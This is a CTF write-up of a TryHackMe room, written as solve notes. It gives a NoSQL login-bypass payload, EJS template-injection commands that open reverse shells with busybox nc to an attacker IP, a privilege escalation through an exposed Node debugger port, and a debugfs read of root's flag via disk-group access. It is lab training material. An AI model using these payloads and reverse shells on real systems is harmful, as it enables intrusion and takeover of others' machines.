# URL
https://tryhackme.com/room/hh-donotdisturb-84a45644
# Concept
* NoSQL Login Bypass
* EJS Template Injection
# Method of solve
## Beginning Scans
* there's port `22` and `80`
* on the landing page, there's a login
* we suspect that the target user is named `attendant`
* there's a NoSQL system in place, MongoDB
  * the framework being used is NodeJS, and MongoDB is often paired with NodeJS
* the payload that gets us in is `username=attendant&password[$ne]=1`
* we can copy the cookie and paste it into our web browser to get acccess
## Initial Access
* the `/staff` endpoint lets us write an EJS script, and we can use EJS for template injection:
```
global.process.mainModule.require('child_process').execSync('which busybox')
```
* this payload will get us in
```
global.process.mainModule.require('child_process').execSync('busybox nc 192.168.134.186 443 -e /bin/bash')
```
## Privilege Escalation
* we are working as the `poolside` user
* if we look at the running processes, we notice something unsual:
```
ps -aux
pipelin+  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```
* nodeJS script, `processor.js` is being run as a process with the `inspect` parameter set to `127.0.0.1:9229`
  * this means that the process is being run in debug mode, and that a debugger tool can connect to the process on localhost port 9229
  * since the process is being run by the `pipelinesvc` user, if we can run commands through the debugger, we will be running them in the context of the `pipelinesvc` user
  * we can run the node debugger on the process with the following command:
  ```Bash
  node inspect 127.0.0.1:9229
  ```
  * and then we can use the `repl` command to start a Read-Eval-Print Loop session, allowing for JS commands to be run
  * then we can run the following command to create a reverse shell connection:
  ```JS
  process.getBuiltinModule('child_process').execSync('busybox nc 192.168.134.186 53 -e /bin/bash').toString()
  ```
* we are now running as the `pipelinesvc` user in a shell terminal
* when we look at our user permissions, we see that we're part of the `disk` group
```
id
```
* members of the `disk` group can run commands on files in mounted disk partitions
* this command will enumerate the mounted disk partitions:
```Bash
ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/*
```
* we see a lot of disk partitions, but the one we want is `/dev/nvme0n1p1`
* we can read the `root.txt` file from the partition with this command
```Bash
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```
* finis
